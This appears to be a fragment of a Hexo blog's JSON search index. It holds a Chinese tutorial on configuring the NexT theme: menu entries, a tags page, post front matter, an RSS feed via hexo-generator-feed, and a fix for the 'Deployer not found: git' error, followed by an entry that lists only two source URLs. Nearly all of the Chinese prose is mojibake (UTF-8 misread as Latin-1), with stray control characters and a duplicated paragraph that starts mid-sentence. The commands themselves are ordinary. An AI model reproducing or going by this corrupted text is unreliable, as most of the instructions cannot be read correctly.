`å¤šè¯´` æˆ–è€…æ˜¯ `Disqus` ç­‰\bè¯„è®ºæ’ä»¶ï¼Œé»˜è®¤é¡µé¢ä¹Ÿä¼šå¸¦è¯„è®ºï¼Œéœ€è¦å…³é—­åˆ™æ·»åŠ  `comments` å­—æ®µï¼Œå¹¶è®¾ç½®å€¼ä¸º `false`\n\nè¿›å…¥åšå®¢æ ¹ç›®å½• ï¼Œæ‰¾åˆ° `themes/next/_config.yml` ï¼Œæ‰¾åˆ°ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹å…¶ `menu` æ ‡ç­¾ã€‚\n```\nmenu:\n  home: / || home\n  tags: /tags/ || tags\n  categories: /categories/ || th\n  archives: /archives/ || archive\n```\nè¿™é‡ŒæŠŠ categories æ ‡ç­¾å‰é¢çš„æ³¨é‡Š  `#` å»æ‰å³å¯ã€‚\n\n### å¯ç”¨æ ‡ç­¾é¡µ\n\né¦–å…ˆæ‰§è¡Œ:\n```\nhexo new page \"tags\"\n```\næ–°å»ºä¸€ä¸ªé¡µé¢ä¸º `tags` çš„æ ‡ç­¾äº‘é¡µé¢ï¼Œç„¶åä¼šè‡ªåŠ¨åœ¨åšå®¢æ ¹ç›®å½•ä¸‹çš„ `source/_posts/` ç”Ÿæˆä¸€ä¸ª `tags` çš„ç›®å½•ï¼Œé‡Œé¢æœ‰ä¸€ä¸ª `index.md`\næ‰“å¼€çœ‹çœ‹å†…å®¹å¦‚ä¸‹ï¼š\n```\n---\ntitle: \"tags\"\ndate: 2018-02-22 11:44:07\n---\n```\nä¿®æ”¹æˆå¦‚ä¸‹\n```\n---\ntitle: æ ‡ç­¾äº‘\ndate: 2018-02-22 11:44:07\ntype: \"tags\"\ncomments: false\n---\n```\nè¿™é‡Œå°±æ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ª `type` å­—æ®µï¼Œç±»å‹å€¼ä¸º `tags`\n> å¦‚æœå¯ç”¨è¿‡ `å¤šè¯´` æˆ–è€…æ˜¯ `Disqus` ç­‰\bè¯„è®ºæ’ä»¶ï¼Œé»˜è®¤é¡µé¢ä¹Ÿä¼šå¸¦è¯„è®ºï¼Œéœ€è¦å…³é—­åˆ™æ·»åŠ  `comments` å­—æ®µï¼Œå¹¶è®¾ç½®å€¼ä¸º `false`\n\nè¿›å…¥åšå®¢æ ¹ç›®å½• ï¼Œæ‰¾åˆ° `themes/next/_config.yml` ï¼Œæ‰¾åˆ°ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹å…¶ `menu` æ ‡ç­¾ã€‚\n```\nmenu:\n  home: / || home\n  tags: /tags/ || tags\n  categories: /categories/ || th\n  archives: /archives/ || archive\n```\nè¿™é‡ŒæŠŠ tags æ ‡ç­¾å‰é¢çš„æ³¨é‡Š  `#` å»æ‰å³å¯ã€‚\n#### åšå®¢ä¸­æ·»åŠ æ ‡ç­¾çš„æ–¹æ³•\n\nåœ¨ `source/_posts` ä¸­æ‰¾åˆ°ä½ åˆ›å»ºçš„åšå®¢\bï¼Œç¼–è¾‘å¤´éƒ¨å†…å®¹ï¼Œæ ¼å¼å¦‚ä¸‹:\n```\n---\ntitle: Hexoåšå®¢è°ƒæ•™æ—¥è®°\ndate: 2018-02-21 17:16:03\ncategories: \"Hexoæ•™ç¨‹\"\ntags:\n    - Hexo\n    - Next\ndescription: \bè®°å½•è‡ªå·±å®‰è£…ä¸ä½¿ç”¨Hexoæ—¶è¸©è¿‡çš„å‘ä¸è§£å†³æ–¹æ³•\n---\n```\nå½“ç„¶ `tags` æ ‡ç­¾ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™\n```\n---\n... (æ­¤å¤„çœç•¥å‰åæ–‡)\ntags: [Hexo,Next]\n...\n---\n```\n`categories` å­—æ®µä¸ºåˆ†ç±»ï¼Œ`description` å­—æ®µä¸ºæè¿°ã€‚\n### æ ‡ç­¾åˆ é™¤çš„æ–¹æ³•\n\nç†è®ºä¸Šåœ¨ MD æ–‡ä»¶çš„å¤´éƒ¨å¯ä»¥åˆ é™¤æ ‡ç­¾ ç„¶åé‡æ–°ç”Ÿæˆå¯ä»¥æ›´æ–° `tags` æ ‡ç­¾é¡µ\nå¦‚æœæ— æ³•æˆåŠŸåˆ é™¤çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•ä¸‹é¢çš„æ–¹æ³•:\nåˆ é™¤æ ¹ç›®å½•çš„ `db.json` ç„¶å `hexo clean && hexo g`\n\n### æ·»åŠ RSS\n\néœ€è¦å®‰è£… `hexo-generator-feed` æ’ä»¶\n\nRSSè¿˜éœ€è¦ä¸€ä¸ªFeedé“¾æ¥ï¼Œè€Œè¿™ä¸ªé“¾æ¥æ˜¯é€šè¿‡ `hexo-generator-feed`  æ’ä»¶ç”Ÿæˆçš„ï¼Œæ‰€ä»¥è¦å…ˆå®‰è£…æ’ä»¶ï¼š\n\n```\nnpm install hexo-generator-feed --save\n```\n\nç„¶åå»é…ç½® **ç«™ç‚¹é…ç½®æ–‡ä»¶** é‡Œçš„Feedä¿¡æ¯ï¼š\n\n```\nvim _config.yml\n```\n\næ‰¾åˆ°å¦‚ä¸‹å†…å®¹ï¼š\n\n```\n# é…ç½®RSS\nfeed:\n  type: atom\n  path: atom.xml\n  limit: 20\n  content: 'true'\n```\n\n`feed` å±æ€§ä¸‹çš„å„ä¸ªå­å±æ€§çš„å«ä¹‰å€Ÿç”¨feedå®˜æ–¹è‹±æ–‡è§£é‡Šå¦‚ä¸‹ï¼š\n\n- type - Feed type. (atom/rss2)\n- path - Feed path. (Default: atom.xml/rss2.xml)\n- limit - Maximum number of posts in the feed (Use 0 or false to show all posts)\n- hub - URL of the PubSubHubbub hubs (Leave it empty if you don't use it)\n- content - (optional) set to 'true' to include the contents of the entire post in the feed.\n\n\n\n\n\n\n\n## å„ç§å‘å’Œè§£å†³æ–¹æ³•\n### å¯¼èˆªè§£æé”™è¯¯\n> é—®é¢˜æè¿°:\n\nä½ å‘ç°ä½ å†™çš„MDæ ¼å¼éƒ½æ˜¯æ­£å¸¸çš„\bï¼Œä½†æ˜¯å‘ç°Nextè‡ªåŠ¨è§£æçš„å¯¼èˆªï¼Œå´ä¸åˆäººæ„ï¼Œç”šè‡³ä½ å¯ä»¥å‘ç°æ­£æ–‡çš„ä»£ç æ®µæ··ä¹±ä»€ä¹ˆçš„æƒ…å†µ\n> è§£å†³æ–¹æ³•:\n\næ‰¾æ‰¾å…¨æ–‡ä»£ç æ®µä¸­çš„ç”¨æ¥åˆ’åˆ†ä»£ç æ®µç”¨çš„ä¸‰ä¸ªç‚¹æœ«å°¾æ˜¯å¦å‡ºç°ç©ºæ ¼ï¼Œåˆ é™¤ä¹‹\bï¼Œè§£å†³ã€‚\n\n### ERROR Deployer not found: git\n> é—®é¢˜æè¿°:\n\nåœ¨æ‰§è¡Œ\b `hexo d` çš„æ—¶å€™ï¼Œå‡ºç° `ERROR Deployer not found: git`é”™è¯¯\n> \bè§£å†³æ–¹æ¡ˆ:\n\nè¿›å…¥åšå®¢æ ¹ç›®å½•ï¼Œæ‰§è¡Œï¼š\n```\nnpm install  hexo-deployer-git --save\n```\n","tags":["Hexo"],"categories":["Hexoæ•™ç¨‹"]},{"title":"Hexoçš„nextä¸»é¢˜ä¸ªæ€§åŒ–æ•™ç¨‹:æ‰“é€ ç‚«é…·ç½‘ç«™","url":"%2F2018%2F02%2F02%2FHexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E6%95%99%E7%A8%8B-%E6%89%93%E9%80%A0%E7%82%AB%E9%85%B7%E7%BD%91%E7%AB%99%2F","content":"\nvia: https://www.jianshu.com/p/f054333ac9e6\n\nhttps://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/","tags":["Hexo"],"categories":["Hexoæ•™ç¨‹"]}]